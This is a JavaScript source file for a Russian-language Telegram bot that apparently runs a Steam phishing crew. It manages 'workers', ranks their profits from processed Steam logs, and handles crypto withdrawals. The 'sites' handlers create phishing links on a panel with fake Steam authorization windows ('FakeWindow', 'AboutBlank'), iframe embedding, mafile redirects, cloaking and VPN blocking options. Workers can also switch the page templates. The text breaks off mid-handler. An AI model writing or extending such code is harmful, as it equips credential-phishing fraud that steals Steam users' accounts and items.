const { adminPanelKeyboard, memberActionKeyboard } = require("../keyboards/admin");
const {
  acceptedStartKeyboard,
  rulesAcceptKeyboard,
  profileKeyboard,
  aboutProjectKeyboard,
  aboutRulesBackKeyboard,
  settingsKeyboard,
  topWorkersKeyboard,
  sitesKeyboard,
  sitesBindMethodKeyboard,
  domainLinksKeyboard,
  linkCreatorKeyboard,
  linkWindowTypeKeyboard,
  templatesKeyboard,
  teamDomainKeyboard,
  referralLinkKeyboard,
  referralWindowKeyboard,
  referralTemplatesPageKeyboard,
  referralTemplatePreviewKeyboard,
  walletKeyboard,
  withdrawMethodKeyboard,
  payoutModerationKeyboard,
} = require("../keyboards/common");
const { renderHome } = require("../commands/start");
const {
  ensureUser,
  isAdminTelegramId,
  setBan,
  setTeamMember,
  getUserByTelegramId,
  toggleAnonymous,
  searchTeamMembers,
  isTeamReferralPathTaken,
  getTeamReferralForDomain,
  upsertTeamReferral,
} = require("../services/userService");
const { getUserProfitStatsByTelegramId } = require("../services/profitService");
const {
  getAvailableUsd,
  hasPendingRequest,
  createWithdrawalRequest,
  setAwaitingPayoutLink,
  rejectPayout,
  listUserRequests,
  buildChannelMessageHtml,
  buildApprovedChannelSuffix,
  buildRejectedChannelSuffix,
  attachChannelMeta,
  resetPendingApproval,
  methodLabel,
} = require("../services/withdrawalService");
const {
  getPendingApplicationById,
  updateApplicationStatus,
} = require("../services/applicationService");
const {
  createWorkerAccount,
  authCredentials,
  getDomains,
  getDomainsList,
  isDomainAvailable,
  getActualIPs,
  getCloudflareNameservers,
  getSteamLinks,
  getTemplates,
  createSteamLink,
  updateSteamLink,
  getTeamWorkers,
} = require("../services/apiService");
const { env } = require("../config/env");
const { getProjectRulesLines } = require("../config/projectRules");
const { generatePassword } = require("../utils/password");
const {
  generateReferralCode,
  formatReferralLinkHtml,
  escapeHtml,
} = require("../utils/referral");
const { logger } = require("../utils/logger");
const { upsertBotMessage } = require("../utils/message");
const SteamLog = require("../models/SteamLog");
const ProfitTransaction = require("../models/ProfitTransaction");
const User = require("../models/User");
const { getGlobalWorkerPercent, setGlobalWorkerPercent } = require("../services/settingsService");

function requireAdmin(ctx) {
  if (!isAdminTelegramId(ctx.from.id)) {
    ctx.answerCbQuery("Недостаточно прав", { show_alert: true });
    return false;
  }
  return true;
}

function periodLabel(period) {
  const map = {
    all: "за всё время",
    "24h": "за 24 часа",
    "7d": "за 7 дней",
    "30d": "за 30 дней",
  };
  return map[period] || map.all;
}

function formatMoney(value) {
  return `$${Number(value || 0).toFixed(2)}`;
}

async function getProjectProfitStats() {
  const [stats] = await SteamLog.aggregate([
    { $match: { status: "processed" } },
    {
      $group: {
        _id: null,
        totalProfit: { $sum: "$totalProfit" },
        count: { $sum: 1 },
      },
    },
  ]);

  return {
    totalProfit: Number(stats?.totalProfit || 0),
    count: Number(stats?.count || 0),
  };
}

function buildAutoPanelUsername(userLike) {
  const usernameRaw = String(userLike?.username || "")
    .replace(/^@/, "")
    .trim()
    .toLowerCase();
  const usernameClean = usernameRaw.replace(/[^a-z0-9_]/g, "");
  if (usernameClean.length >= 5 && usernameClean.length <= 24) {
    return usernameClean;
  }

  const telegramId = String(userLike?.telegramId || userLike?.id || "").replace(/\D/g, "");
  const fallback = `user${telegramId}`.replace(/[^a-z0-9_]/g, "");
  return fallback.slice(0, 24).padEnd(5, "0");
}

function extractPanelOwnerId(authData) {
  const candidates = [
    authData?.id,
    authData?.user?.id,
    authData?.account?.id,
    authData?.data?.id,
    authData?.data?.user?.id,
  ];
  const found = candidates.find((v) => Number.isFinite(Number(v)));
  return found ? Number(found) : null;
}

function filterAvailableDomains(rows = [], accountId) {
  if (!Array.isArray(rows)) return [];
  return rows.filter((d) => {
    if (d?.isTeamPublic === true) return true;
    if (Number.isFinite(Number(accountId)) && Number(d?.owner) === Number(accountId)) return true;
    return false;
  });
}

function filterOwnDomainsOnly(rows = [], accountId) {
  if (!Array.isArray(rows) || !Number.isFinite(Number(accountId))) return [];
  return rows.filter((d) => Number(d?.owner) === Number(accountId));
}

async function getPanelToken(user) {
  if (!user?.panelUsername || !user?.panelPassword) {
    throw new Error("Панель еще не привязана к аккаунту.");
  }
  const auth = await authCredentials(user.panelUsername, user.panelPassword);
  if (!auth.token) {
    throw new Error("Не удалось авторизоваться в панели.");
  }
  let ownerId = null;
  try {
    const workers = await getTeamWorkers(auth.token, 0, 100);
    const rows = workers?.rows || [];
    const matched = rows.find(
      (row) =>
        String(row?.username || "").toLowerCase() ===
        String(user.panelUsername || "").toLowerCase()
    );
    if (matched?.id) ownerId = Number(matched.id);
  } catch (_) {
    // fallback below
  }
  if (!Number.isFinite(Number(ownerId))) {
    ownerId = extractPanelOwnerId(auth.data);
  }
  if (!Number.isFinite(Number(ownerId))) {
    throw new Error("Не удалось определить ID аккаунта панели. Повторите вход позже.");
  }
  return {
    token: auth.token,
    ownerId: Number(ownerId),
  };
}

async function deleteReferralPreviewMessage(ctx) {
  const id = ctx.session?.refPreviewMessageId;
  if (!id) return;
  try {
    await ctx.telegram.deleteMessage(ctx.chat.id, id);
  } catch (_) {
    /* уже удалено */
  }
  if (ctx.session) ctx.session.refPreviewMessageId = null;
}

function pickReferralRow(rows, existing) {
  return (
    (rows || []).find(
      (r) =>
        (Number(existing.panelLinkId) > 0 &&
          Number(r?.id) === Number(existing.panelLinkId)) ||
        String(r?.path) === String(existing.path)
    ) || {
      path: existing.path,
      online: 0,
      stats: [],
      template: null,
      windowType: "FakeWindow",
    }
  );
}

async function resolveReferralPanelLinkId(auth, user, domainId, existing) {
  const stored = Math.trunc(Number(existing.panelLinkId));
  if (Number.isFinite(stored) && stored > 0) return stored;
  const linksResponse = await getSteamLinks(auth.token, domainId, 0, 50);
  const row = pickReferralRow(linksResponse?.rows || [], existing);
  const id = Math.trunc(Number(row?.id));
  if (Number.isFinite(id) && id > 0) {
    await upsertTeamReferral(user.telegramId, {
      domainId,
      path: existing.path,
      panelLinkId: id,
    });
    return id;
  }
  return null;
}

async function renderReferralScreen(ctx, user, domainId, authMaybe = null) {
  const auth = authMaybe || (await getPanelToken(user));
  const domainsResponse = await getDomains(auth.token, 0, 50);
  const available = filterAvailableDomains(domainsResponse?.rows || [], auth.ownerId);
  const domain = available.find((d) => Number(d.id) === domainId);
  if (!domain) {
    throw new Error("Домен недоступен для вашего аккаунта панели.");
  }
  const domainName = domain.domain || ctx.session?.sites?.activeDomainName || "";
  const existing = await getTeamReferralForDomain(user.telegramId, domainId);
  if (!existing) {
    throw new Error("Реферальная ссылка ещё не создана.");
  }
  const linksResponse = await getSteamLinks(auth.token, domainId, 0, 50);
  const row = pickReferralRow(linksResponse?.rows || [], existing);
  await deleteReferralPreviewMessage(ctx);
  await upsertBotMessage(
    ctx,
    formatReferralLinkHtml(domainName, existing.path, row),
    { reply_markup: referralLinkKeyboard(domainId).reply_markup }
  );
  return { auth, domainName, existing, row };
}

function getAboutInviteSession(ctx) {
  if (!ctx.session.aboutInviteLinks) ctx.session.aboutInviteLinks = {};
  return ctx.session.aboutInviteLinks;
}

async function handleAboutProtectedChannelClick(ctx, channelKey) {
  const map = {
    workers_chat: env.aboutWorkersChatId,
    payouts: env.aboutPayoutsChatId,
    manuals: env.aboutManualsChatId,
  };
  const chatId = map[channelKey];
  if (!chatId) {
    await ctx.answerCbQuery("Канал не настроен", { show_alert: true });
    return;
  }
  const invites = getAboutInviteSession(ctx);

  try {
    if (!invites[channelKey]) {
      const created = await ctx.telegram.createChatInviteLink(chatId, {});
      invites[channelKey] = created.invite_link;
    }

    const markup = aboutProjectKeyboard(env.aboutInfoChannelUrl, invites).reply_markup;
    try {
      await ctx.editMessageReplyMarkup(markup);
    } catch (editErr) {
      logger.warn("editMessageReplyMarkup about keyboard failed", editErr?.message || editErr);
    }

    await ctx.answerCbQuery("Ссылка приглашения создана. Нажмите заново на кнопку", {
      show_alert: true,
    });
  } catch (e) {
    const desc = e?.response?.description || e.message || "Не удалось создать ссылку";
    await ctx.answerCbQuery(String(desc).slice(0, 200), { show_alert: true });
  }
}

async function showReferralTemplateList(ctx, user, domainId, page) {
  const auth = await getPanelToken(user);
  const existing = await getTeamReferralForDomain(user.telegramId, domainId);
  if (!existing) {
    throw new Error("Сначала создайте реферальную ссылку.");
  }
  const linkId = await resolveReferralPanelLinkId(auth, user, domainId, existing);
  if (!linkId) {
    throw new Error("Не найден ID ссылки в панели. Откройте раздел снова позже.");
  }
  const limit = 15;
  const safePage = Math.max(0, Number(page) || 0);
  const offset = safePage * limit;
  const res = await getTemplates(auth.token, offset, limit);
  const rows = res?.rows || [];
  const hasPrev = safePage > 0;
  const hasNext = res?.hasNextPage === true;
  ctx.session.refTemplateById = { ...(ctx.session.refTemplateById || {}) };
  for (const r of rows) {
    if (r?.id != null) ctx.session.refTemplateById[r.id] = r;
  }
  await deleteReferralPreviewMessage(ctx);
  const text = [
    "📄 <b>Шаблоны</b>",
    "",
    "Нажмите на строку с <b>🖼</b>, чтобы открыть <b>предпросмотр</b> картинки.",
    "",
    `Страница: <b>${safePage + 1}</b>`,
  ].join("\n");
  await upsertBotMessage(ctx, text, {
    reply_markup: referralTemplatesPageKeyboard(
      domainId,
      rows,
      safePage,
      hasPrev,
      hasNext
    ).reply_markup,
  });
}

async function renderProfile(ctx, period = "all") {
  const user = await ensureUser(ctx.from);
  const roleLabel =
    user.role === "admin" ? "Администратор" : user.isTeamMember ? "Воркер" : "Пользователь";
  const daysWithTeam = Math.max(
    1,
    Math.floor((Date.now() - new Date(user.createdAt).getTime()) / (1000 * 60 * 60 * 24))
  );
  const stats = await getUserProfitStatsByTelegramId(user.telegramId, period);
  const periodProfit = stats ? stats.periodProfit : 0;
  const operationsCount = stats ? stats.operationsCount : 0;

  const lines = [
    `👤 <b>Твой профиль</b> [<code>${user.telegramId}</code>]`,
    ` ┖ Статус: ${roleLabel}`,
    "",
    `📊 <b>Статистика ${periodLabel(period)}:</b>`,
  ];

  if (operationsCount > 0) {
    lines.push(` ┖ Профит: ${formatMoney(periodProfit)}`);
    lines.push(` ┖ Операций: ${operationsCount}`);
  } else {
    lines.push(" ┖ Профиты отсутствуют.");
  }

  lines.push("");
  lines.push(`О себе: ${user.bio || "Отсутствует"}`);
  lines.push("");
  lines.push(`С нами: ${daysWithTeam} день`);

  await upsertBotMessage(ctx, lines.join("\n"), {
    reply_markup: profileKeyboard(period).reply_markup,
  });
}

async function renderSettings(ctx) {
  const user = await ensureUser(ctx.from);
  const nickOpen = !user.isAnonymous;
  await upsertBotMessage(
    ctx,
    [
      "⚙️ <b>Настройки</b>",
      "",
      "<blockquote>Тут вы можете настроить своё рабочее пространство!</blockquote>",
      "",
      `Ваш ник в профитах: <b>${nickOpen ? "Открыт" : "Скрыт"}</b>`,
    ].join("\n"),
    { reply_markup: settingsKeyboard(nickOpen).reply_markup }
  );
}

function periodSince(period) {
  const now = Date.now();
  if (period === "24h") return new Date(now - 24 * 60 * 60 * 1000);
  if (period === "7d") return new Date(now - 7 * 24 * 60 * 60 * 1000);
  if (period === "30d") return new Date(now - 30 * 24 * 60 * 60 * 1000);
  return null;
}

/** Фраза для «За …» / «Итого за …» без дублирования «за» */
function topPeriodTopic(period) {
  const map = {
    all: "всё время",
    "24h": "24 часа",
    "7d": "7 дней",
    "30d": "30 дней",
  };
  return map[period] || map.all;
}

async function renderTopWorkers(ctx, period = "all") {
  const since = period === "all" ? null : periodSince(period);
  const match = since ? { createdAt: { $gte: since } } : {};

  const agg = await ProfitTransaction.aggregate([
    { $match: match },
    {
      $group: {
        _id: "$userId",
        total: { $sum: "$workerShare" },
        count: { $sum: 1 },
      },
    },
    { $sort: { total: -1 } },
    { $limit: 10 },
  ]);

  const userIds = agg.map((a) => a._id);
  const members = await User.find({ _id: { $in: userIds } }).select("username telegramId");
  const byId = new Map(members.map((m) => [String(m._id), m]));

  const rows = agg.map((a) => {
    const user = byId.get(String(a._id));
    return {
      username: user?.username || user?.telegramId || String(a._id),
      total: Number(a.total || 0),
      count: Number(a.count || 0),
    };
  });

  const totalAmount = rows.reduce((sum, r) => sum + r.total, 0);
  const totalCount = rows.reduce((sum, r) => sum + (r.count || 0), 0);
  const medal = ["🥇", "🥈", "🥉"];
  const topic = topPeriodTopic(period);

  const lines = [
    "🏆 <b>Топ воркеров команды.</b>",
    "",
    `За <b>${topic}</b> <i>(начислено по профитам)</i>:`,
    "",
  ];
  if (rows.length === 0) {
    lines.push("Пока нет данных по выбранному периоду.");
  } else {
    rows.forEach((r, i) => {
      const icon = medal[i] || "🔹";
      const countPart = r.count > 0 ? ` - ${r.count} шт.` : "";
      lines.push(`${icon} ${r.username} — ${formatMoney(r.total)}${countPart}`);
    });
    lines.push("");
    lines.push(
      `Итого за <b>${topic}</b>: ${formatMoney(totalAmount)}${totalCount ? ` - ${totalCount} шт.` : ""}`
    );
  }

  await upsertBotMessage(ctx, lines.join("\n"), {
    reply_markup: topWorkersKeyboard(period).reply_markup,
  });
}

function registerCallbackHandlers(bot) {
  bot.action("menu:home", renderHome);

  bot.action("menu:apply", async (ctx) => {
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, getProjectRulesLines().join("\n"), {
      reply_markup: rulesAcceptKeyboard().reply_markup,
    });
  });

  bot.action("app:rules_accept", async (ctx) => {
    try {
      await ctx.deleteMessage();
      if (ctx.session?.ui) {
        ctx.session.ui.messageId = null;
      }
    } catch (_) {
      // Message may already be deleted; continue flow.
    }
    await ctx.answerCbQuery("Вы приняли правила команды!");
    await ctx.scene.enter("applicationScene");
  });

  bot.action("menu:profile", async (ctx) => {
    await ctx.answerCbQuery();
    if (ctx.session) ctx.session.walletWithdraw = null;
    await renderProfile(ctx, "all");
  });

  bot.action(/^profile:stats:(all|24h|7d|30d)$/, async (ctx) => {
    const period = ctx.match[1];
    await ctx.answerCbQuery(`Период: ${periodLabel(period)}`);
    await renderProfile(ctx, period);
  });

  bot.action("profile:profits", async (ctx) => {
    const user = await ensureUser(ctx.from);
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      [
        "💸 <b>Мои профиты</b>",
        "",
        `Общий профит: ${formatMoney(user.totalProfit)}`,
        `Твоя доля: ${user.profitPercent}%`,
      ].join("\n"),
      { reply_markup: profileKeyboard("all").reply_markup }
    );
  });

  bot.action("profile:wallet", async (ctx) => {
    await ctx.answerCbQuery();
    if (ctx.session) ctx.session.walletWithdraw = null;
    const user = await ensureUser(ctx.from);
    const available = await getAvailableUsd(user);
    const minW = env.walletMinWithdrawalUsd;
    const canWithdraw =
      available >= minW && !(await hasPendingRequest(user.telegramId));
    await upsertBotMessage(
      ctx,
      [
        "<b>Кошелёк 👛</b>",
        "",
        `💰 <b>Баланс:</b> ${formatMoney(available)}`,
        `⚠️ Вывод от ${formatMoney(minW)}`,
      ].join("\n"),
      {
        parse_mode: "HTML",
        reply_markup: walletKeyboard({ showWithdraw: canWithdraw }).reply_markup,
      }
    );
  });

  bot.action("wallet:withdraw", async (ctx) => {
    const user = await ensureUser(ctx.from);
    const available = await getAvailableUsd(user);
    const minW = env.walletMinWithdrawalUsd;
    if (available + 1e-9 < minW) {
      await ctx.answerCbQuery(`Минимум ${formatMoney(minW)}`, { show_alert: true });
      return;
    }
    if (await hasPendingRequest(user.telegramId)) {
      await ctx.answerCbQuery("Уже есть активная заявка", { show_alert: true });
      return;
    }
    ctx.session.walletWithdraw = { step: "amount" };
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      [
        "Введите <b>сумму вывода в долларах США ($)</b>.",
        "",
        `Доступно: <b>${formatMoney(available)}</b>`,
        `Минимум: <b>${formatMoney(minW)}</b>`,
      ].join("\n"),
      {
        parse_mode: "HTML",
        reply_markup: walletKeyboard({ showWithdraw: false }).reply_markup,
      }
    );
  });

  bot.action("wallet:history", async (ctx) => {
    await ctx.answerCbQuery();
    const user = await ensureUser(ctx.from);
    const list = await listUserRequests(user.telegramId, 12);
    const available = await getAvailableUsd(user);
    const minW = env.walletMinWithdrawalUsd;
    const canWithdraw =
      available >= minW && !(await hasPendingRequest(user.telegramId));
    const statusRu = {
      pending: "ожидает",
      awaiting_payout_link: "ожидает ссылку",
      approved: "выплачено",
      rejected: "отклонено",
    };
    if (!list.length) {
      await upsertBotMessage(ctx, "📜 История заявок пуста.", {
        reply_markup: walletKeyboard({ showWithdraw: canWithdraw }).reply_markup,
      });
      return;
    }
    const lines = ["📜 <b>История заявок</b>", ""];
    for (const r of list) {
      const st = statusRu[r.status] || r.status;
      lines.push(
        `• <b>$${Number(r.amountUsd).toFixed(2)}</b> — ${methodLabel(r.method)} — ${st} — ${new Date(r.createdAt).toLocaleString("ru-RU")}`
      );
    }
    await upsertBotMessage(ctx, lines.join("\n"), {
      parse_mode: "HTML",
      reply_markup: walletKeyboard({ showWithdraw: canWithdraw }).reply_markup,
    });
  });

  bot.action(/^wallet:method:(xRocketr|cryptobot|usdt_ton)$/, async (ctx) => {
    const method = ctx.match[1];
    const user = await ensureUser(ctx.from);
    const st = ctx.session?.walletWithdraw;
    if (!st || st.step !== "method" || !Number.isFinite(Number(st.amount))) {
      await ctx.answerCbQuery("Начните вывод заново", { show_alert: true });
      return;
    }
    const amount = Number(st.amount);
    ctx.session.walletWithdraw = null;
    try {
      const doc = await createWithdrawalRequest(user, amount, method);
      const text = buildChannelMessageHtml(doc);
      const msg = await ctx.telegram.sendMessage(env.payoutRequestsChannelId, text, {
        parse_mode: "HTML",
        reply_markup: payoutModerationKeyboard(doc._id.toString()).reply_markup,
      });
      await attachChannelMeta(doc._id, msg.chat.id, msg.message_id);
      await ctx.answerCbQuery("Заявка отправлена");
      await upsertBotMessage(
        ctx,
        [
          "✅ <b>Заявка на выплату создана</b>",
          "",
          `Сумма: ${formatMoney(amount)}`,
          `Способ: ${methodLabel(method)}`,
          "",
          "Ожидайте подтверждения администратора.",
        ].join("\n"),
        {
          parse_mode: "HTML",
          reply_markup: walletKeyboard({
            showWithdraw: false,
          }).reply_markup,
        }
      );
    } catch (e) {
      await ctx.answerCbQuery();
      await upsertBotMessage(ctx, `❌ ${e.message}`, {
        reply_markup: walletKeyboard({ showWithdraw: true }).reply_markup,
      });
    }
  });

  bot.action(/^payout:approve:([a-f0-9]{24})$/i, async (ctx) => {
    if (!isAdminTelegramId(ctx.from.id)) {
      await ctx.answerCbQuery("Нет прав", { show_alert: true });
      return;
    }
    const id = ctx.match[1];
    const updated = await setAwaitingPayoutLink(id, ctx.from.id);
    if (!updated) {
      await ctx.answerCbQuery("Заявка недоступна или уже обработана", { show_alert: true });
      return;
    }
    try {
      await ctx.telegram.sendMessage(
        ctx.from.id,
        [
          "✅ <b>Одобрение выплаты</b>",
          "",
          `Заявка: <code>${id}</code>`,
          `Пользователь: @${updated.username || "—"} (<code>${updated.telegramId}</code>)`,
          `Сумма: <b>$${Number(updated.amountUsd).toFixed(2)}</b>`,
          `Способ: ${methodLabel(updated.method)}`,
          "",
          "Пришлите <b>следующим сообщением</b> ссылку для пользователя (https://…).",
        ].join("\n"),
        { parse_mode: "HTML" }
      );
      await ctx.answerCbQuery("Отправьте ссылку в ЛС бота");
    } catch (e) {
      await resetPendingApproval(id);
      await ctx.answerCbQuery("Откройте бота в ЛС и нажмите Start", { show_alert: true });
    }
  });

  bot.action(/^payout:reject:([a-f0-9]{24})$/i, async (ctx) => {
    if (!isAdminTelegramId(ctx.from.id)) {
      await ctx.answerCbQuery("Нет прав", { show_alert: true });
      return;
    }
    const id = ctx.match[1];
    const req = await rejectPayout(id, ctx.from.id);
    if (!req) {
      await ctx.answerCbQuery("Заявка недоступна", { show_alert: true });
      return;
    }
    await ctx.answerCbQuery("Выплата отклонена");
    try {
      await ctx.telegram.sendMessage(
        req.telegramId,
        "❌ Ваша заявка на выплату <b>отклонена</b>.",
        { parse_mode: "HTML" }
      );
    } catch (_) {
      /* ignore */
    }
    if (req.channelChatId && req.channelMessageId) {
      try {
        const base = buildChannelMessageHtml(req);
        await ctx.telegram.editMessageText(
          req.channelChatId,
          Number(req.channelMessageId),
          undefined,
          base + buildRejectedChannelSuffix(),
          { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } }
        );
      } catch (_) {
        /* ignore */
      }
    }
  });

  bot.action("menu:sites", async (ctx) => {
    const user = await ensureUser(ctx.from);
    try {
      const auth = await getPanelToken(user);
      const domainsResponse = await getDomains(auth.token, 0, 15);
      const domains = filterAvailableDomains(domainsResponse?.rows || [], auth.ownerId);
      ctx.session.sites = { domains, ownerId: auth.ownerId || null };
      await ctx.answerCbQuery();
      await upsertBotMessage(
        ctx,
        domains.length > 0
          ? "🌐 <b>Ваши домены</b>\nВыберите домен или добавьте новый:"
          : "🌐 <b>Ваши домены</b>\nСобственные домены не найдены. Вы можете добавить новый.",
        {
        reply_markup: sitesKeyboard(domains).reply_markup,
        }
      );
    } catch (error) {
      await ctx.answerCbQuery();
      await upsertBotMessage(ctx, `❌ ${error.message}`);
    }
  });

  bot.action(/^sites:domain:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const user = await ensureUser(ctx.from);
    try {
      const auth = await getPanelToken(user);
      const domainsResponse = await getDomains(auth.token, 0, 15);
      const ownDomains = filterAvailableDomains(domainsResponse?.rows || [], auth.ownerId);
      const found = ownDomains.find((d) => Number(d.id) === domainId);
      if (!found) {
        await ctx.answerCbQuery("Этот домен не принадлежит вашему аккаунту", {
          show_alert: true,
        });
        return;
      }

      const linksResponse = await getSteamLinks(auth.token, domainId, 0, 15);
      const rawLinks = linksResponse?.rows || [];
      const links = rawLinks.filter(
        (l) => Number(l?.owner) === Number(auth.ownerId)
      );
      const isOwnDomain = Number(found.owner) === Number(auth.ownerId);
      ctx.session.sites = {
        ...(ctx.session.sites || {}),
        ownerId: auth.ownerId || ctx.session?.sites?.ownerId || null,
        activeDomainId: domainId,
        activeDomainName: found.domain,
        links,
      };
      await ctx.answerCbQuery();
      await upsertBotMessage(
        ctx,
        [
          `🌐 <b>Домен:</b> <code>${found.domain}</code>`,
        ].join("\n"),
        {
          reply_markup: (
            isOwnDomain
              ? domainLinksKeyboard(domainId, links)
              : teamDomainKeyboard(domainId)
          ).reply_markup,
        }
      );
    } catch (error) {
      await ctx.answerCbQuery();
      await upsertBotMessage(ctx, `❌ Ошибка получения ссылок: ${error.message}`);
    }
  });

  bot.action(/^sites:ref:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const user = await ensureUser(ctx.from);
    await ctx.answerCbQuery();

    let auth;
    try {
      auth = await getPanelToken(user);
    } catch (e) {
      await upsertBotMessage(ctx, `❌ ${e.message}`);
      return;
    }

    const kbTeam = { reply_markup: teamDomainKeyboard(domainId).reply_markup };
    const kbRef = { reply_markup: referralLinkKeyboard(domainId).reply_markup };

    try {
      const domainsResponse = await getDomains(auth.token, 0, 50);
      const available = filterAvailableDomains(domainsResponse?.rows || [], auth.ownerId);
      const domain = available.find((d) => Number(d.id) === domainId);
      if (!domain) {
        await upsertBotMessage(ctx, "❌ Домен недоступен для вашего аккаунта панели.", kbTeam);
        return;
      }

      const domainName = domain.domain || ctx.session?.sites?.activeDomainName || "";

      const existing = await getTeamReferralForDomain(user.telegramId, domainId);
      if (existing) {
        await renderReferralScreen(ctx, user, domainId, auth);
        return;
      }

      const templateId = env.referralTemplateId;
      if (!Number.isFinite(Number(templateId)) || Number(templateId) <= 0) {
        await upsertBotMessage(
          ctx,
          "❌ Укажите корректный <code>REFERRAL_TEMPLATE_ID</code> в настройках бота.",
          kbTeam
        );
        return;
      }

      const maxAttempts = 25;
      let lastError = null;
      for (let attempt = 0; attempt < maxAttempts; attempt += 1) {
        const path = generateReferralCode(4);
        const taken = await isTeamReferralPathTaken(domainId, path);
        if (taken) continue;

        const payload = {
          path,
          windowType: "FakeWindow",
          domain: domainId,
          template: Number(templateId),
          cloaking: false,
          ban_vpn: false,
          iframe: true,
          logError: true,
          mafileError: false,
          mafileSteamRedirect: true,
          tradeError: true,
          randPath: false,
        };

        try {
          const created = await createSteamLink(auth.token, payload);
          const linkId = created?.id ?? null;
          const finalPath =
            created?.path != null && String(created.path).length > 0
              ? String(created.path).replace(/^\/+/, "")
              : path;
          await upsertTeamReferral(user.telegramId, {
            domainId,
            path: finalPath,
            panelLinkId: linkId,
          });

          const linksResponse = await getSteamLinks(auth.token, domainId, 0, 50);
          const row =
            (linksResponse?.rows || []).find(
              (r) =>
                (linkId != null && Number(r?.id) === Number(linkId)) ||
                String(r?.path) === String(finalPath)
            ) ||
            created ||
            { path: finalPath, online: 0, stats: [] };

          await upsertBotMessage(ctx, formatReferralLinkHtml(domainName, finalPath, row), kbRef);
          return;
        } catch (error) {
          const message =
            error?.response?.data?.message ||
            error?.response?.data?.code ||
            error.message;
          lastError = message;
          if (/exist|занят|taken|duplicate|unique|conflict/i.test(String(message))) {
            continue;
          }
          await upsertBotMessage(ctx, `❌ Ошибка создания реф-ссылки: ${message}`, kbTeam);
          return;
        }
      }

      await upsertBotMessage(
        ctx,
        `❌ Не удалось выделить уникальный код${lastError ? `: ${lastError}` : "."}`,
        kbTeam
      );
    } catch (error) {
      await upsertBotMessage(ctx, `❌ ${error.message}`, kbTeam);
    }
  });

  bot.action(/^sites:ref:back:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    const user = await ensureUser(ctx.from);
    try {
      await renderReferralScreen(ctx, user, domainId);
    } catch (e) {
      await upsertBotMessage(ctx, `❌ ${e.message}`, {
        reply_markup: teamDomainKeyboard(domainId).reply_markup,
      });
    }
  });

  bot.action(/^sites:ref:template:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    const user = await ensureUser(ctx.from);
    try {
      await showReferralTemplateList(ctx, user, domainId, 0);
    } catch (e) {
      await upsertBotMessage(ctx, `❌ ${e.message}`, {
        reply_markup: referralLinkKeyboard(domainId).reply_markup,
      });
    }
  });

  bot.action(/^sites:ref:tplpage:(\d+):(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const page = Number(ctx.match[2]);
    await ctx.answerCbQuery();
    const user = await ensureUser(ctx.from);
    try {
      await showReferralTemplateList(ctx, user, domainId, page);
    } catch (e) {
      await upsertBotMessage(ctx, `❌ ${e.message}`, {
        reply_markup: referralLinkKeyboard(domainId).reply_markup,
      });
    }
  });

  bot.action(/^sites:ref:tpv:(\d+):(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const templateId = Number(ctx.match[2]);
    const user = await ensureUser(ctx.from);
    const existing = await getTeamReferralForDomain(user.telegramId, domainId);
    if (!existing) {
      await ctx.answerCbQuery("Сначала создайте реферальную ссылку", { show_alert: true });
      return;
    }
    await ctx.answerCbQuery();
    const tpl = ctx.session?.refTemplateById?.[templateId];
    if (!tpl) {
      await upsertBotMessage(
        ctx,
        "❌ Шаблон не найден. Откройте список шаблонов снова.",
        { reply_markup: referralLinkKeyboard(domainId).reply_markup }
      );
      return;
    }
    await deleteReferralPreviewMessage(ctx);
    const caption = [`🖼 <b>${escapeHtml(tpl.name || "Шаблон")}</b>`, "", `<code>ID: ${tpl.id}</code>`].join(
      "\n"
    );
    const extra = {
      parse_mode: "HTML",
      reply_markup: referralTemplatePreviewKeyboard(domainId, templateId).reply_markup,
    };
    let sent;
    const preview = String(tpl.preview || "").trim();
    if (preview && /^https?:\/\//i.test(preview)) {
      sent = await ctx.replyWithPhoto(preview, { caption, ...extra });
    } else {
      sent = await ctx.reply(`🖼 <b>Предпросмотр недоступен</b>\n\n${caption}`, extra);
    }
    ctx.session.refPreviewMessageId = sent.message_id;
  });

  bot.action(/^sites:ref:tset:(\d+):(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const templateId = Number(ctx.match[2]);
    const user = await ensureUser(ctx.from);
    const existing = await getTeamReferralForDomain(user.telegramId, domainId);
    if (!existing) {
      await ctx.answerCbQuery("Нет реферальной ссылки", { show_alert: true });
      return;
    }
    try {
      const auth = await getPanelToken(user);
      const linkId = await resolveReferralPanelLinkId(auth, user, domainId, existing);
      if (!linkId) {
        await ctx.answerCbQuery("Не найден ID ссылки", { show_alert: true });
        return;
      }
      await updateSteamLink(auth.token, domainId, linkId, { template: templateId });
      await ctx.answerCbQuery("Шаблон обновлён");
      await deleteReferralPreviewMessage(ctx);
      await renderReferralScreen(ctx, user, domainId, auth);
    } catch (e) {
      const message =
        e?.response?.data?.message || e?.response?.data?.code || e.message;
      await ctx.answerCbQuery();
      await upsertBotMessage(ctx, `❌ Не удалось сменить шаблон: ${message}`, {
        reply_markup: referralLinkKeyboard(domainId).reply_markup,
      });
    }
  });

  bot.action(/^sites:ref:window:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    const user = await ensureUser(ctx.from);
    const existing = await getTeamReferralForDomain(user.telegramId, domainId);
    if (!existing) {
      await upsertBotMessage(ctx, "❌ Сначала создайте реферальную ссылку.", {
        reply_markup: teamDomainKeyboard(domainId).reply_markup,
      });
      return;
    }
    await deleteReferralPreviewMessage(ctx);
    await upsertBotMessage(ctx, "🪟 <b>Окно авторизации Steam</b>\n\nВыберите тип:", {
      reply_markup: referralWindowKeyboard(domainId).reply_markup,
    });
  });

  bot.action(/^sites:ref:win:(\d+):(FakeWindow|CurrentWindow|NewWindow|AboutBlank)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const windowType = ctx.match[2];
    const user = await ensureUser(ctx.from);
    const existing = await getTeamReferralForDomain(user.telegramId, domainId);
    if (!existing) {
      await ctx.answerCbQuery("Нет реферальной ссылки", { show_alert: true });
      return;
    }
    try {
      const auth = await getPanelToken(user);
